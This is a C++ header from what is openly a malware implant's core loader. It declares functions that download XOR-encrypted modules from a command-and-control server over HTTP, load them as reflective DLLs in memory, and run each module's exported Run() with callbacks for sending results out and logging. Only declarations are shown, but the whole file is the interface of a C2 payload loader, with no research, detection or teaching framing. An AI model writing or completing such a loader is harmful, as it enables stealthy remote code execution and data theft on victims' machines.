// Core/loader.h
#pragma once
#include <windows.h>
#include <vector>
#include <string>

// Callback API for modules
struct ModuleAPI {
    void (*send_result)(const uint8_t* data, size_t len);
    void (*log)(const char* msg);
    const char* (*get_config)(const char* key); // optional
};

// Download encrypted module from C2 server via HTTP
bool download_module(const std::string& name, std::vector<uint8_t>& out_data);

// Reflective DLL loader: map PE into memory, resolve imports/relocs, call entry point
bool load_reflective_dll(const std::vector<uint8_t>& dll_data, void*& module_base);

// Execute module: find exported Run() function and call it with ModuleAPI
bool execute_module(void* module_base, const ModuleAPI& api);

// XOR decrypt (in-place)
void xor_decrypt(std::vector<uint8_t>& data, uint8_t key = 0xAA);